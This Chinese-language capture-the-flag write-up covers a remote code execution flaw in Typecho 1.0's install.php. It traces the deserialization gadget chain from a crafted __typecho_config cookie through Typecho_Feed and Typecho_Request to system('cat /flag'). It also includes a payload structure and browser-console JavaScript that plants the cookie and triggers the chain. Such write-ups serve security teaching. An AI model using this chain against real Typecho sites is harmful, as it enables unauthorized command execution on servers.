---
draft: true
---


# Typecho install.php 反序列化漏洞 Writeup

## 题目信息

| 项目 | 内容 |
|------|------|
| **靶机地址** | `node4.anna.nssctf.cn:2161` |
| **题目类型** | Web - PHP反序列化 |
| **框架** | Typecho CMS |
| **版本** | 1.0/14.10.10 |
| **Flag** | `NSSCTF{7142be72-772e-4691-9c42-972da71e605a}` |

---

## 漏洞概述

Typecho 是一款 PHP 博客系统。题目的附件是 Typecho 源码，在 `install.php` 中存在 **PHP 反序列化漏洞**。攻击者可以通过构造恶意的序列化 Cookie，触发远程代码执行（RCE），最终获取服务器上的 Flag。

---

## 漏洞分析

### 1. 漏洞点定位

在 `install.php` 中有两处反序列化入口：

**位置1: `?finish` 路径（第231行）**
```php
$config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));
```
需要满足：`config.inc.php` 不存在，且 `$_SESSION` 已启动。

**位置2: `?start` 路径（第284行）**
```php
$config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));
```
需要满足：`config.inc.php` 不存在，**无需 session 检查**。

两种路径都是从 Cookie `__typecho_config` 中读取 **base64 编码的序列化数据** 并执行 `unserialize()`，这构成了 PHP 反序列化漏洞入口。

### 2. CSRF 检查绕过

`install.php` 第63-76行有 Referer 检查：
```php
if (!empty($_GET) || !empty($_POST)) {
    if (empty($_SERVER['HTTP_REFERER'])) { exit; }
    // 检查 Referer host 是否匹配 HTTP_HOST
}
```

**绕过方式**：由于是从 `install.php` 同页面发起 `fetch()` 请求，浏览器会自动携带正确的 `Referer` 头，无需额外处理。

### 3. Cookie 编码注意事项

`Typecho_Cookie::set()` 使用 `rawurlencode()` 编码 Cookie 值：
```php
setrawcookie($key, rawurlencode($value), $expire, self::$_path);
```

而 PHP 的 `$_COOKIE` 超全局数组会自动 URL-decode Cookie 值。因此：
- base64 中的 `+` 号会被 URL-decode 成**空格**
- 需要在 JavaScript 中使用 `encodeURIComponent()` 对 Cookie 值编码（`+` → `%2B`），确保 PHP 解码后 base64 正确还原

### 4. Gadget Chain（利用链）

完整的反序列化利用链如下：

```
unserialize(base64_decode($_COOKIE['__typecho_config']))
    ↓
得到数组: ['adapter' => Typecho_Feed对象, 'prefix' => 'typecho_']
    ↓
explode('_', $config['adapter'])
    ↓ 对象转字符串触发 __toString()
Typecho_Feed::__toString()
    ↓ RSS2 分支第291行: $item['author']->screenName
Typecho_Request::__get('screenName')
    → get('screenName')
    → _applyFilter($command_string)
    ↓
call_user_func($filter, $command_string)
    ↓ 如 $filter='system', $command_string='cat /flag'
system('cat /flag') → RCE！
```

#### 详细步骤：

**Step 1** — 反序列化后得到：
```
['adapter' => Typecho_Feed对象, 'prefix' => 'typecho_']
```

**Step 2** — `install.php:284` 调用 `explode('_', $config['adapter'])`：
`$config['adapter']` 是 `Typecho_Feed` 对象，`explode()` 第二个参数要求字符串，PHP 自动调用 `__toString()`。

**Step 3** — `Typecho_Feed::__toString()` 在 RSS 2.0 分支中（第291行）：
```php
// 题目作者添加的提示注释
// 给师傅们减轻负担QAQ，要加上$item['category'] = array(new Typecho_Request());
// 和$this->_type防止500
$content .= '<dc:creator>' . htmlspecialchars($item['author']->screenName) . '</dc:creator>' . self::EOL;
```
访问 `$item['author']->screenName`，由于 `$item['author']` 是 `Typecho_Request` 对象，触发 `__get('screenName')`。

**Step 4** — `Typecho_Request::get('screenName')`：
```php
public function get($key, $default = NULL) {
    $value = $this->_params[$key];  // 取出我们的命令字符串
    return $this->_applyFilter($value);
}
```

**Step 5** — `Typecho_Request::_applyFilter()`（第159-171行）：
```php
private function _applyFilter($value) {
    if ($this->_filter) {
        foreach ($this->_filter as $filter) {
            $value = call_user_func($filter, $value);
        }
    }
    return $value;
}
```
当 `$filter = 'system'`，`$value = 'cat /flag'` 时，执行 `call_user_func('system', 'cat /flag')`。

**Step 6** — `system('cat /flag')` 执行系统命令，Flag 输出到 HTTP 响应中！

---

## 漏洞利用

### Payload 结构

```python
payload = {
    'adapter': Typecho_Feed(
        _type='RSS 2.0',
        _items=[{
            'author': Typecho_Request(
                _filter=['system'],         # ← 被 call_user_func 调用的函数
                _params={'screenName': 'cat /flag'},  # ← 传递给 system 的参数
            ),
            'title': 'test',
            'link': 'http://example.com',
            'date': 1234567890,
        }]
    ),
    'prefix': 'typecho_',
}
# serialized → base64 → set as Cookie
```

### 利用步骤

1. **生成 Payload**：使用 Python 脚本 `exploit.py` 构造 PHP 序列化 Payload，base64 编码后写入 Cookie
2. **绕过 CSRF**：在目标 `install.php` 页面通过浏览器 Console 执行 JavaScript 的 `fetch()`，同源请求自动携带 Referer
3. **触发反序列化**：设置 Cookie 为恶意 Payload 后，请求 `install.php?start`
4. **获取 Flag**：`system('cat /flag')` 在服务器上执行，输出出现在 HTTP 响应正文中

### 浏览器 Console 执行

最终使用的 JavaScript 代码（已写入 `exploit_system.js`）：

```javascript
var p = "YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVj...";  // base64 payload
document.cookie = "__typecho_config=" + encodeURIComponent(p) + ";path=/";
fetch("install.php?start", {credentials: "include"})
  .then(r => r.text())
  .then(t => console.log(t));
```

### 利用结果

服务器返回的 HTTP 响应中直接包含 Flag：
```
NSSCTF{7142be72-772e-4691-9c42-972da71e605a}
```

---

## 关键问题与解决

| 问题 | 原因 | 解决方案 |
|------|------|----------|
| Cookie 值被破坏 | base64 中的 `+` 经 PHP `$_COOKIE` URL-decode 后变成空格 | 使用 `encodeURIComponent()` 编码 Cookie 值 |
| `assert()` 执行失败（500） | PHP 7.2+ 中 `assert()` 字符串求值被废弃/禁用 | 改用 `system` 作为 filter 直接执行命令 |
| 输出截断看不清 | Console 默认折叠长输出 | 展开折叠区域，或搜索 "flag" |

---

## 总结

这是一个PHP反序列化漏洞的综合利用，涉及以下考点：

1. **PHP 反序列化基础**：`unserialize()` 处理不可信数据导致的安全风险
2. **Gadget Chain 构造**：利用 `__toString()` → `__get()` → `call_user_func()` 魔术方法链
3. **类自动加载机制**：PHP unserialize 时通过 `spl_autoload_register` 自动加载未定义的类
4. **Cookie 编码问题**：PHP `$_COOKIE` 的 URL-decode 特性对 Payload 的影响及修复
5. **PHP 配置差异**：`assert()` 在不同 PHP 版本中的行为差异，使用 `system()` 作为备选

## 参考

- Typecho 源码版本: 1.0/14.10.10
- 漏洞类型: CWE-502 (Deserialization of Untrusted Data)
- 利用文件: `exploit.py`, `exploit_system.js`
